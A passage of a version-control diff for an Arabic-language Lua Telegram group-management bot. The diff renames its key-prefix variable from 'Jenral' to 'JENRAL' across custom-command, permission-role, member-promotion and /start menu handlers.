-DevALI:del(Jenral.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
+DevALI:del(JENRAL.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
 return false
 end
-if text and text:match('^'..(DevALI:get(Jenral..'ALI:NameBot') or "الجنرال")..' ') then
-data.message_.content_.text_ = data.message_.content_.text_:gsub('^'..(DevALI:get(Jenral..'ALI:NameBot') or "الجنرال")..' ','')
+if text and text:match('^'..(DevALI:get(JENRAL..'ALI:NameBot') or "جنرال ")..' ') then
+data.message_.content_.text_ = data.message_.content_.text_:gsub('^'..(DevALI:get(JENRAL..'ALI:NameBot') or "جنرال ")..' ','')
 end
 if data.message_.content_.text_ then
-local NewCmmd = DevALI:get(Jenral.."Set:Cmd:Group:New1"..msg.chat_id_..":"..data.message_.content_.text_)
+local NewCmmd = DevALI:get(JENRAL.."Set:Cmd:Group:New1"..msg.chat_id_..":"..data.message_.content_.text_)
 if NewCmmd then
 data.message_.content_.text_ = (NewCmmd or data.message_.content_.text_)
 end
 end
-if text and DevALI:get(Jenral.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
-DevALI:set(Jenral.."Set:Cmd:Group:New"..msg.chat_id_,text)
+if text and DevALI:get(JENRAL.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
+DevALI:set(JENRAL.."Set:Cmd:Group:New"..msg.chat_id_,text)
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙ارسل الامر الجديد", 1, 'html')
-DevALI:del(Jenral.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
-DevALI:set(Jenral.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_,"true1") 
+DevALI:del(JENRAL.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
+DevALI:set(JENRAL.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_,"true1") 
 return false
 end
-if text and DevALI:get(Jenral.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_) == "true1" then
-local NewCmd = DevALI:get(Jenral.."Set:Cmd:Group:New"..msg.chat_id_)
-DevALI:set(Jenral.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text,NewCmd)
-DevALI:sadd(Jenral.."List:Cmd:Group:New"..msg.chat_id_,text)
+if text and DevALI:get(JENRAL.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_) == "true1" then
+local NewCmd = DevALI:get(JENRAL.."Set:Cmd:Group:New"..msg.chat_id_)
+DevALI:set(JENRAL.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text,NewCmd)
+DevALI:sadd(JENRAL.."List:Cmd:Group:New"..msg.chat_id_,text)
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ الامر", 1, 'html')
-DevALI:del(Jenral.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_)
+DevALI:del(JENRAL.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_)
 return false
 end
 if Constructor(msg) then
 if text == "الاوامر المضافه" and ChCheck(msg) then
-local List = DevALI:smembers(Jenral.."List:Cmd:Group:New"..msg.chat_id_.."") 
+local List = DevALI:smembers(JENRAL.."List:Cmd:Group:New"..msg.chat_id_.."") 
 t = "⌁︙قائمة الاوامر المضافه ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 for k,v in pairs(List) do
-Cmds = DevALI:get(Jenral.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
+Cmds = DevALI:get(JENRAL.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
 if Cmds then 
 t = t..k.."~ ("..v..") • {"..Cmds.."}\n"
 else
@@ -1473,55 +1473,55 @@ end
 Dev_ALI(msg.chat_id_, msg.id_, 1, t, 1, 'html')
 end
 if text == "حذف الاوامر المضافه" or text == "حذف الاوامر" or text == "مسح الاوامر المضافه" and ChCheck(msg) then
-local List = DevALI:smembers(Jenral.."List:Cmd:Group:New"..msg.chat_id_)
+local List = DevALI:smembers(JENRAL.."List:Cmd:Group:New"..msg.chat_id_)
 for k,v in pairs(List) do
-DevALI:del(Jenral.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
-DevALI:del(Jenral.."List:Cmd:Group:New"..msg.chat_id_)
+DevALI:del(JENRAL.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
+DevALI:del(JENRAL.."List:Cmd:Group:New"..msg.chat_id_)
 end
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم حذف الاوامر المضافه في المجموعه", 1, 'html')
 end
 if text == "ترتيب الاوامر" then
-DevALI:set(Jenral.."Set:Cmd:Group:New1"..msg.chat_id_..":ا","ايدي")
-DevALI:sadd(Jenral.."List:Cmd:Group:New"..msg.chat_id_,"ا")
-DevALI:set(Jenral.."Set:Cmd:Group:New1"..msg.chat_id_..":تك","تنزيل الكل")
-DevALI:sadd(Jenral.."List:Cmd:Group:New"..msg.chat_id_,"تك")
-DevALI:set(Jenral.."Set:Cmd:Group:New1"..msg.chat_id_..":م","رفع مميز")
-DevALI:sadd(Jenral.."List:Cmd:Group:New"..msg.chat_id_,"م")
-DevALI:set(Jenral.."Set:Cmd:Group:New1"..msg.chat_id_..":اد","رفع ادمن")
-DevALI:sadd(Jenral.."List:Cmd:Group:New"..msg.chat_id_,"اد")
-DevALI:set(Jenral.."Set:Cmd:Group:New1"..msg.chat_id_..":مد","رفع مدير")
-DevALI:sadd(Jenral.."List:Cmd:Group:New"..msg.chat_id_,"مد")
-DevALI:set(Jenral.."Set:Cmd:Group:New1"..msg.chat_id_..":من","رفع منشئ")
-DevALI:sadd(Jenral.."List:Cmd:Group:New"..msg.chat_id_,"من")
-DevALI:set(Jenral.."Set:Cmd:Group:New1"..msg.chat_id_..":اس","رفع منشئ اساسي")
-DevALI:sadd(Jenral.."List:Cmd:Group:New"..msg.chat_id_,"اس")
-DevALI:set(Jenral.."Set:Cmd:Group:New1"..msg.chat_id_..":تعط","تعطيل الايدي بالصوره")
-DevALI:sadd(Jenral.."List:Cmd:Group:New"..msg.chat_id_,"تعط")
-DevALI:set(Jenral.."Set:Cmd:Group:New1"..msg.chat_id_..":تفع","تفعيل الايدي بالصوره")
-DevALI:sadd(Jenral.."List:Cmd:Group:New"..msg.chat_id_,"تفع")
+DevALI:set(JENRAL.."Set:Cmd:Group:New1"..msg.chat_id_..":ا","ايدي")
+DevALI:sadd(JENRAL.."List:Cmd:Group:New"..msg.chat_id_,"ا")
+DevALI:set(JENRAL.."Set:Cmd:Group:New1"..msg.chat_id_..":تك","تنزيل الكل")
+DevALI:sadd(JENRAL.."List:Cmd:Group:New"..msg.chat_id_,"تك")
+DevALI:set(JENRAL.."Set:Cmd:Group:New1"..msg.chat_id_..":م","رفع مميز")
+DevALI:sadd(JENRAL.."List:Cmd:Group:New"..msg.chat_id_,"م")
+DevALI:set(JENRAL.."Set:Cmd:Group:New1"..msg.chat_id_..":اد","رفع ادمن")
+DevALI:sadd(JENRAL.."List:Cmd:Group:New"..msg.chat_id_,"اد")
+DevALI:set(JENRAL.."Set:Cmd:Group:New1"..msg.chat_id_..":مد","رفع مدير")
+DevALI:sadd(JENRAL.."List:Cmd:Group:New"..msg.chat_id_,"مد")
+DevALI:set(JENRAL.."Set:Cmd:Group:New1"..msg.chat_id_..":من","رفع منشئ")
+DevALI:sadd(JENRAL.."List:Cmd:Group:New"..msg.chat_id_,"من")
+DevALI:set(JENRAL.."Set:Cmd:Group:New1"..msg.chat_id_..":اس","رفع منشئ اساسي")
+DevALI:sadd(JENRAL.."List:Cmd:Group:New"..msg.chat_id_,"اس")
+DevALI:set(JENRAL.."Set:Cmd:Group:New1"..msg.chat_id_..":تعط","تعطيل الايدي بالصوره")
+DevALI:sadd(JENRAL.."List:Cmd:Group:New"..msg.chat_id_,"تعط")
+DevALI:set(JENRAL.."Set:Cmd:Group:New1"..msg.chat_id_..":تفع","تفعيل الايدي بالصوره")
+DevALI:sadd(JENRAL.."List:Cmd:Group:New"..msg.chat_id_,"تفع")
 send(msg.chat_id_, msg.id_,"⌁︙تم ترتيب الاوامر بالشكل التالي ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙ايدي ↫ ا\n⌁︙تنزيل الكل ↫ تك\n⌁︙رفع مميز ↫ م\n⌁︙رفع ادمن ↫ اد \n⌁︙رفع مدير ↫ مد \n⌁︙رفع منشئ ↫ من \n⌁︙رفع منشئ اساسي ↫ اس  \n⌁︙تفعيل الايدي بالصوره ↫ تفع\n⌁︙تعطيل الايدي بالصوره ↫ تعط\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉")  
 end
 if text == "اضف امر" or text == "اضافة امر" or text == "اضافه امر" and ChCheck(msg) then
-DevALI:set(Jenral.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
+DevALI:set(JENRAL.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙ارسل الامر القديم", 1, 'html')
 return false
 end
 if text == "حذف امر" or text == "مسح امر" and ChCheck(msg) then 
-DevALI:set(Jenral.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
+DevALI:set(JENRAL.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙ارسل الامر الذي قمت باضافته يدويا", 1, 'html')
 return false
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text == "الصلاحيات" or text == "صلاحيات" and ChCheck(msg) then 
-local List = DevALI:smembers(Jenral.."Coomds"..msg.chat_id_)
+local List = DevALI:smembers(JENRAL.."Coomds"..msg.chat_id_)
 if #List == 0 then
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙لاتوجد صلاحيات مضافه", 1, 'html')
 return false
 end
 t = "⌁︙قائمة الصلاحيات المضافه ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 for k,v in pairs(List) do
-var = DevALI:get(Jenral.."Comd:New:rt:ALI:"..v..msg.chat_id_)
+var = DevALI:get(JENRAL.."Comd:New:rt:ALI:"..v..msg.chat_id_)
 if var then
 t = t..k.."~ "..v.." • ("..var..")\n"
 else
@@ -1532,30 +1532,30 @@ Dev_ALI(msg.chat_id_, msg.id_, 1, t, 1, 'html')
 end
 if Admin(msg) then
 if text == "حذف الصلاحيات" and ChCheck(msg) or text == "مسح الصلاحيات" and ChCheck(msg) then
-local List = DevALI:smembers(Jenral.."Coomds"..msg.chat_id_)
+local List = DevALI:smembers(JENRAL.."Coomds"..msg.chat_id_)
 for k,v in pairs(List) do
-DevALI:del(Jenral.."Comd:New:rt:ALI:"..v..msg.chat_id_)
-DevALI:del(Jenral.."Coomds"..msg.chat_id_)
+DevALI:del(JENRAL.."Comd:New:rt:ALI:"..v..msg.chat_id_)
+DevALI:del(JENRAL.."Coomds"..msg.chat_id_)
 end
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم حذف الصلاحيات المضافه", 1, 'html')
 end
 end
 if text and text:match("^اضف صلاحيه (.*)$") and ChCheck(msg) then 
 ComdNew = text:match("^اضف صلاحيه (.*)$")
-DevALI:set(Jenral.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_,ComdNew)  
-DevALI:sadd(Jenral.."Coomds"..msg.chat_id_,ComdNew)  
-DevALI:setex(Jenral.."Comd:New"..msg.chat_id_..msg.sender_user_id_,200,true)  
+DevALI:set(JENRAL.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_,ComdNew)  
+DevALI:sadd(JENRAL.."Coomds"..msg.chat_id_,ComdNew)  
+DevALI:setex(JENRAL.."Comd:New"..msg.chat_id_..msg.sender_user_id_,200,true)  
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙ارسل نوع الصلاحيه \n{ عضو • مميز  • ادمن  • مدير }\n⌁︙ارسل الغاء لالغاء الامر ", 1, 'html')
 end
 if text and text:match("^حذف صلاحيه (.*)$") and ChCheck(msg) or text and text:match("^مسح صلاحيه (.*)$") and ChCheck(msg) then 
 ComdNew = text:match("^حذف صلاحيه (.*)$") or text:match("^مسح صلاحيه (.*)$")
-DevALI:del(Jenral.."Comd:New:rt:ALI:"..ComdNew..msg.chat_id_)
+DevALI:del(JENRAL.."Comd:New:rt:ALI:"..ComdNew..msg.chat_id_)
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم حذف الصلاحيه", 1, 'html')
 end
-if DevALI:get(Jenral.."Comd:New"..msg.chat_id_..msg.sender_user_id_) then 
+if DevALI:get(JENRAL.."Comd:New"..msg.chat_id_..msg.sender_user_id_) then 
 if text and text:match("^الغاء$") then 
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء الامر", 1, 'html')
-DevALI:del(Jenral.."Comd:New"..msg.chat_id_..msg.sender_user_id_) 
+DevALI:del(JENRAL.."Comd:New"..msg.chat_id_..msg.sender_user_id_) 
 return false  
 end 
 if text == "مدير" then
@@ -1577,32 +1577,32 @@ return false
 end
 end
 if text == "مدير" or text == "ادمن" or text == "مميز" or text == "عضو" then
-local textn = DevALI:get(Jenral.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_)  
-DevALI:set(Jenral.."Comd:New:rt:ALI:"..textn..msg.chat_id_,text)
+local textn = DevALI:get(JENRAL.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_)  
+DevALI:set(JENRAL.."Comd:New:rt:ALI:"..textn..msg.chat_id_,text)
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم اضافة الصلاحيه", 1, 'html')
-DevALI:del(Jenral.."Comd:New"..msg.chat_id_..msg.sender_user_id_) 
+DevALI:del(JENRAL.."Comd:New"..msg.chat_id_..msg.sender_user_id_) 
 return false  
 end 
 end
 
 if text and text:match("رفع (.*)") and tonumber(msg.reply_to_message_id_) > 0 then 
 local DEV_ABBAS = text:match("رفع (.*)")
-if DevALI:sismember(Jenral.."Coomds"..msg.chat_id_,DEV_ABBAS) then
+if DevALI:sismember(JENRAL.."Coomds"..msg.chat_id_,DEV_ABBAS) then
 function by_reply(extra, result, success)   
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-local mrALI = DevALI:get(Jenral.."Comd:New:rt:ALI:"..DEV_ABBAS..msg.chat_id_)
+local mrALI = DevALI:get(JENRAL.."Comd:New:rt:ALI:"..DEV_ABBAS..msg.chat_id_)
 if mrALI == "مميز" and VipMem(msg) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'GENRALTEAM')..')'..' ❩\n⌁︙تم رفعه ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
-DevALI:set(Jenral.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_ABBAS) 
-DevALI:sadd(Jenral..'ALI:VipMem:'..msg.chat_id_, result.sender_user_id_)
+DevALI:set(JENRAL.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_ABBAS) 
+DevALI:sadd(JENRAL..'ALI:VipMem:'..msg.chat_id_, result.sender_user_id_)
 elseif mrALI == "ادمن" and Admin(msg) then 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'GENRALTEAM')..')'..' ❩\n⌁︙تم رفعه ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
-DevALI:set(Jenral.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_ABBAS)
-DevALI:sadd(Jenral..'ALI:Admins:'..msg.chat_id_, result.sender_user_id_)
+DevALI:set(JENRAL.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_ABBAS)
+DevALI:sadd(JENRAL..'ALI:Admins:'..msg.chat_id_, result.sender_user_id_)
 elseif mrALI == "مدير" and Manager(msg) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'GENRALTEAM')..')'..' ❩\n⌁︙تم رفعه ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
-DevALI:set(Jenral.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_ABBAS)  
-DevALI:sadd(Jenral..'ALI:Managers:'..msg.chat_id_, result.sender_user_id_)
+DevALI:set(JENRAL.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_ABBAS)  
+DevALI:sadd(JENRAL..'ALI:Managers:'..msg.chat_id_, result.sender_user_id_)
 elseif mrALI == "عضو" then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'GENRALTEAM')..')'..' ❩\n⌁︙تم رفعه ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
 end
@@ -1613,22 +1613,22 @@ end
 end
 if text and text:match("تنزيل (.*)") and tonumber(msg.reply_to_message_id_) > 0 then 
 local DEV_ABBAS = text:match("تنزيل (.*)")
-if DevALI:sismember(Jenral.."Coomds"..msg.chat_id_,DEV_ABBAS) then
+if DevALI:sismember(JENRAL.."Coomds"..msg.chat_id_,DEV_ABBAS) then
 function by_reply(extra, result, success)   
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-local mrALI = DevALI:get(Jenral.."Comd:New:rt:ALI:"..DEV_ABBAS..msg.chat_id_)
+local mrALI = DevALI:get(JENRAL.."Comd:New:rt:ALI:"..DEV_ABBAS..msg.chat_id_)
 if mrALI == "مميز" and VipMem(msg) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'GENRALTEAM')..')'..' ❩\n⌁︙تم تنزيله ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
-DevALI:srem(Jenral..'ALI:VipMem:'..msg.chat_id_, result.sender_user_id_)
-DevALI:del(Jenral.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:VipMem:'..msg.chat_id_, result.sender_user_id_)
+DevALI:del(JENRAL.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
 elseif mrALI == "ادمن" and Admin(msg) then 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'GENRALTEAM')..')'..' ❩\n⌁︙تم تنزيله ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
-DevALI:srem(Jenral..'ALI:Admins:'..msg.chat_id_, result.sender_user_id_)
-DevALI:del(Jenral.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:Admins:'..msg.chat_id_, result.sender_user_id_)
+DevALI:del(JENRAL.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
 elseif mrALI == "مدير" and Manager(msg) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'GENRALTEAM')..')'..' ❩\n⌁︙تم تنزيله ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
-DevALI:srem(Jenral..'ALI:Managers:'..msg.chat_id_, result.sender_user_id_)
-DevALI:del(Jenral.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:Managers:'..msg.chat_id_, result.sender_user_id_)
+DevALI:del(JENRAL.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
 elseif mrALI == "عضو" then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'GENRALTEAM')..')'..' ❩\n⌁︙تم تنزيله ❨ '..DEV_ABBAS..' ❩ بنجاح', 1, 'md')
 end
@@ -1639,22 +1639,22 @@ end
 end
 if text and text:match("^رفع (.*) @(.*)") then 
 local text1 = {string.match(text, "^(رفع) (.*) @(.*)$")}
-if DevALI:sismember(Jenral.."Coomds"..msg.chat_id_,text1[2]) then
+if DevALI:sismember(JENRAL.."Coomds"..msg.chat_id_,text1[2]) then
 function py_username(extra, result, success)   
 if result.id_ then
-local mrALI = DevALI:get(Jenral.."Comd:New:rt:ALI:"..text1[2]..msg.chat_id_)
+local mrALI = DevALI:get(JENRAL.."Comd:New:rt:ALI:"..text1[2]..msg.chat_id_)
 if mrALI == "مميز" and VipMem(msg) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'GENRALTEAM')..')'..' ❩\n⌁︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
-DevALI:sadd(Jenral..'ALI:VipMem:'..msg.chat_id_, result.id_)
-DevALI:set(Jenral.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
+DevALI:sadd(JENRAL..'ALI:VipMem:'..msg.chat_id_, result.id_)
+DevALI:set(JENRAL.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
 elseif mrALI == "ادمن" and Admin(msg) then 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'GENRALTEAM')..')'..' ❩\n⌁︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
-DevALI:sadd(Jenral..'ALI:Admins:'..msg.chat_id_, result.id_)
-DevALI:set(Jenral.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
+DevALI:sadd(JENRAL..'ALI:Admins:'..msg.chat_id_, result.id_)
+DevALI:set(JENRAL.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
 elseif mrALI == "مدير" and Manager(msg) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'GENRALTEAM')..')'..' ❩\n⌁︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
-DevALI:sadd(Jenral..'ALI:Managers:'..msg.chat_id_, result.id_)
-DevALI:set(Jenral.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
+DevALI:sadd(JENRAL..'ALI:Managers:'..msg.chat_id_, result.id_)
+DevALI:set(JENRAL.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
 elseif mrALI == "عضو" then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'GENRALTEAM')..')'..' ❩\n⌁︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
 end
@@ -1667,22 +1667,22 @@ end
 end
 if text and text:match("^تنزيل (.*) @(.*)") then 
 local text1 = {string.match(text, "^(تنزيل) (.*) @(.*)$")}
-if DevALI:sismember(Jenral.."Coomds"..msg.chat_id_,text1[2]) then
+if DevALI:sismember(JENRAL.."Coomds"..msg.chat_id_,text1[2]) then
 function py_username(extra, result, success)   
 if result.id_ then
-local mrALI = DevALI:get(Jenral.."Comd:New:rt:ALI:"..text1[2]..msg.chat_id_)
+local mrALI = DevALI:get(JENRAL.."Comd:New:rt:ALI:"..text1[2]..msg.chat_id_)
 if mrALI == "مميز" and VipMem(msg) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'GENRALTEAM')..')'..' ❩\n⌁︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
-DevALI:srem(Jenral..'ALI:VipMem:'..msg.chat_id_, result.id_)
-DevALI:del(Jenral.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
+DevALI:srem(JENRAL..'ALI:VipMem:'..msg.chat_id_, result.id_)
+DevALI:del(JENRAL.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
 elseif mrALI == "ادمن" and Admin(msg) then 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'GENRALTEAM')..')'..' ❩\n⌁︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
-DevALI:srem(Jenral..'ALI:Admins:'..msg.chat_id_, result.id_)
-DevALI:del(Jenral.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
+DevALI:srem(JENRAL..'ALI:Admins:'..msg.chat_id_, result.id_)
+DevALI:del(JENRAL.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
 elseif mrALI == "مدير" and Manager(msg) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'GENRALTEAM')..')'..' ❩\n⌁︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
-DevALI:srem(Jenral..'ALI:Managers:'..msg.chat_id_, result.id_)
-DevALI:del(Jenral.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
+DevALI:srem(JENRAL..'ALI:Managers:'..msg.chat_id_, result.id_)
+DevALI:del(JENRAL.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
 elseif mrALI == "عضو" then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'GENRALTEAM')..')'..' ❩\n⌁︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
 end
@@ -1693,28 +1693,28 @@ end
 tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
 end  
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if msg.chat_id_ then
 local id = tostring(msg.chat_id_)
 if id:match("-100(%d+)") then
-DevALI:incr(Jenral..'ALI:UsersMsgs'..Jenral..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_)
-DevALI:incr(Jenral..'ALI:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
-DevALI:incr(Jenral..'ALI:MsgNumberDay'..msg.chat_id_..':'..os.date('%d'))  
+DevALI:incr(JENRAL..'ALI:UsersMsgs'..JENRAL..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_)
+DevALI:incr(JENRAL..'ALI:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
+DevALI:incr(JENRAL..'ALI:MsgNumberDay'..msg.chat_id_..':'..os.date('%d'))  
 ChatType = 'sp' 
 elseif id:match("^(%d+)") then
-if not DevALI:sismember(Jenral.."ALI:Users",msg.chat_id_) then
-DevALI:sadd(Jenral.."ALI:Users",msg.chat_id_)
+if not DevALI:sismember(JENRAL.."ALI:Users",msg.chat_id_) then
+DevALI:sadd(JENRAL.."ALI:Users",msg.chat_id_)
 end
 ChatType = 'pv' 
 else
 ChatType = 'gp' 
 end
 end 
---     Source Jenral     --
+--     Source JENRAL     --
 if ChatType == 'pv' then 
 if text == '/start' or text == 'رجوع ،🔙‘' then 
 if SecondSudo(msg) then 
-local Sudo_Welcome = '⌁︙مرحبا عزيزي المطور \n⌁︙انت المطور الاساسي هنا \n⌁︙اليك ازرار سورس الجنرال \n⌁︙تستطيع التحكم بكل الاوامر فقط اضغط على الامر الذي تريد تنفيذه'
+local Sudo_Welcome = '⌁︙مرحبا عزيزي المطور \n⌁︙انت المطور الاساسي هنا \n⌁︙اليك ازرار سورس جنرال  \n⌁︙تستطيع التحكم بكل الاوامر فقط اضغط على الامر الذي تريد تنفيذه'
 local key = {
 {'وضع اسم البوت','↫ تحديث ⌁','وضع كليشه المطور'},
 {'↫ المطورين ⌁','↫ الاحصائيات ⌁'},
@@ -1742,7 +1742,7 @@ return false
 end end
 if text == '~ تعيين كلايش الاوامر ~' then 
 if SecondSudo(msg) then 
-local Sudo_Welcome = '⌁︙اهلا بك مجددا عزيزي المطور \n⌁︙اليك الازرار الخاصه بتعديل وتغيير كلايش سورس الجنرال فقط اضغط على الامر الذي تريد تنفيذه'
+local Sudo_Welcome = '⌁︙اهلا بك مجددا عزيزي المطور \n⌁︙اليك الازرار الخاصه بتعديل وتغيير كلايش سورس جنرال  فقط اضغط على الامر الذي تريد تنفيذه'
 local key = {
 {'حذف كليشة الايدي','تعيين كليشة الايدي'},
 {'تعيين امر الاوامر'},
@@ -1755,10 +1755,10 @@ SendInline(msg.chat_id_,Sudo_Welcome,key)
 return false
 end end
 if text == '/start' and ChCheck(msg) then  
-if not DevALI:get(Jenral..'ALI:Start:Time'..msg.sender_user_id_) then
-tdcli_function({ID="GetUser",user_id_=Jenral},function(arg,dp) 
+if not DevALI:get(JENRAL..'ALI:Start:Time'..msg.sender_user_id_) then
+tdcli_function({ID="GetUser",user_id_=JENRAL},function(arg,dp) 
 local inline = {{{text="⌁ اضفني في مجموعتك ⌁",url="t.me/"..dp.username_.."?startgroup=botstart"}}}
-local start = DevALI:get(Jenral.."ALI:Start:Bot")
+local start = DevALI:get(JENRAL.."ALI:Start:Bot")
 if start then 
 Start_Source = start
 else
@@ -1767,11 +1767,11 @@ end
 SendInline(msg.chat_id_,Start_Source,nil,inline)
 end,nil)
 end
-DevALI:setex(Jenral..'ALI:Start:Time'..msg.sender_user_id_,300,true)
